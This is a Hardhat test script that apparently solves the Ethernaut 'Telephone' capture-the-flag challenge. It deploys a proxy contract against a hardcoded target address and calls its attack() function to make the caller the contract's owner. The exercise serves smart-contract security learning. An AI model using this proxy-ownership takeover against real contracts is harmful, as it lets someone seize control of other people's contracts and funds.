import { ethers } from "hardhat";
import { expect } from "chai";

describe("telephone", function() {
    it("Should solve telephone challenge", async function(){ 
        this.timeout(0);

        // setup & check wallet account 
        const accounts = await ethers.getSigners();
        const eoa = accounts[0];
        let balance = await eoa.getBalance();

        console.log(ethers.utils.formatEther(balance));
        expect(balance).to.gt(0);

        // define target abi's necessary parts
        const targetABI = [
            "function owner() public view returns (address)",
        ]
        const targetAddr = "0x8936e5F25875b9211feA34C9c932168e5ca706B3";

        const proxyFactory = await ethers.getContractFactory("TelephoneProxy");
        const proxyCont = await proxyFactory.deploy(targetAddr);
        
        // wait for it to be deployed
        await eoa.provider!.waitForTransaction(proxyCont.deployTransaction.hash);

        let targetCont = new ethers.Contract(targetAddr, targetABI, ethers.getDefaultProvider());
        targetCont = targetCont.connect(eoa);

        let tx = await proxyCont.attack(eoa.address);
        await tx.wait();
        console.log(tx);

        let newowner = await targetCont.owner();
        expect(newowner).to.eq(eoa.address);
    });
});